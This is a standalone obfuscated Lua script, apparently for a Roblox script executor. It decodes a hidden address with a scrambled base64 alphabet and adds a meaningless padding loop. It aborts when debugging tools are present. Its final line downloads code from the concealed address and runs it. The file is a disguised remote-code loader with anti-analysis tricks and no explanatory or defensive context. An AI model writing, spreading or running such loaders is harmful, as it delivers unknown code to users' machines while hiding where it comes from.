local _0x = "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210-+"
local _1x = {}
for _2x = 1, #_0x do
    _1x[_0x:sub(_2x, _2x)] = _2x - 1
end
local _3x = "Zsi9Xsn3oB0Dbcm9adqKYR4QY79EXNu6oAy7ZvC5jMeD"
local _4x = {}
for _5x = 1, #_3x, 4 do
    local _6x = _1x[_3x:sub(_5x, _5x)]
    local _7x = _1x[_3x:sub(_5x + 1, _5x + 1)]
    local _8x = _1x[_3x:sub(_5x + 2, _5x + 2)]
    local _9x = _1x[_3x:sub(_5x + 3, _5x + 3)]
    local _10x = _6x * 262144 + _7x * 4096 + _8x * 64 + _9x
    _4x[#_4x + 1] = string.char(math.floor(_10x / 65536) % 256)
    _4x[#_4x + 1] = string.char(math.floor(_10x / 256) % 256)
    _4x[#_4x + 1] = string.char(_10x % 256)
end
local _11x = table.concat(_4x)
local _12x = 42
for _13x = 1, 10 do
    _12x = _12x + 1
end
if type(debug) == "table" and type(debug.getinfo) == "function" then
    error("")
end
loadstring(game:HttpGet(_11x))()
